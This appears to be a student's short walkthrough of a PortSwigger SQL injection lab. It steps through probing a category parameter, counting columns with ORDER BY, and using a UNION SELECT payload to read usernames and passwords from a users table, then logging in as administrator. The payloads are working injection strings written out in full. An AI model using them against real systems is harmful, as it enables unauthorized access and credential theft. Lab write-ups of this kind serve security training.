**Lab:** SQL injection UNION attack, retrieving data from other tables

**Vulnerability:** basic sql union queries

**Vulnerable Parameter:** category (GET request)

**Technique:** UNION attack with basic queries

**URL:** https://portswigger.net/web-security/sql-injection/union-attacks/lab-retrieve-data-from-other-tables
## Steps:
1. Find category parameter
2. Open Burp Suite and send request to Repeater
3. Test with `'` → Internal Server Error
4. Comment out with `--` → worked
5. Find column count: `' ORDER BY 2--` works, `' ORDER BY 3--` fails  → (2 columns)
6. ' UNION SELECT 'A', 'A'--  → (worked both columns accept text) 
7. ' UNION SELECT username, password from users--
8. Observe the responce u got the username administrator and the password log in with these credentials
9. Lab solved

## Notes:
we got the username and password and users table from the lab description
